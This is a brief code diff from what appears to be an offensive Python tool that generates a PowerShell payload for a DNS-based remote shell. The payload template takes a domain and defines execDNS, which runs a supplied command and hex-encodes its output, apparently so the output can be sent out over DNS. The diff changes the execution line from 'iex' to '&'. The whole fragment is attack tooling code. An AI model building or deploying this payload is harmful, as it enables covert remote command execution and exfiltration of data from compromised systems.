@@ -32,7 +32,7 @@ def prepare_recursive(domain):
    st2 = """
 $url = "%s";
 function execDNS($cmd) {
-$c = iex $cmd 2>&1 | Out-String;
+$c = & $cmd 2>&1 | Out-String;
 $u = [system.Text.Encoding]::UTF8.GetBytes($c);
 $string = [System.BitConverter]::ToString($u);
 $string = $string -replace '-','';
